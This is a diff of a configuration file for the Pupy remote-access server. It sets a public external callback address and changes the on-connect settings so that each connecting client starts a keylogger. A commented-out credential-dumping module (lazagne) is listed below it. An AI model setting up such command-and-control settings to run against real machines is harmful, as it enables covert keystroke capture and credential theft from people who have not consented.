@@ -1,12 +1,13 @@
 [pupyd]
 #listen on all interfaces by default
-#address = 192.168.0.1
-#external = 1.2.3.4
-#external_port = 444
+#address = 10.0.0.139
+#external = 73.181.148.164
+#external_port = 443
 transport = ssl
 port = 443
-ipv6 = true
+ipv6 = false
 logs = false
+sounds = true
 
 #igd=True allow pupy to make UPNP requests to get you external IP.
 igd = false
@@ -24,7 +25,7 @@ allow_requests_to_external_services = false
 use_gnome_keyring=false
 
 ping = 0
-ping_timeout = 2
+ping_timeout = 10
 
 [ssl]
 client_cert_required = true
@@ -59,7 +60,7 @@ crypto = crypto
 wwwroot = data/wwwroot
 
 [on_connect]
-#run_module1 = gather/keylogger start
+run_module1 = gather/keylogger start
 #run_module2 = lazagne
 
 [default_viewers]
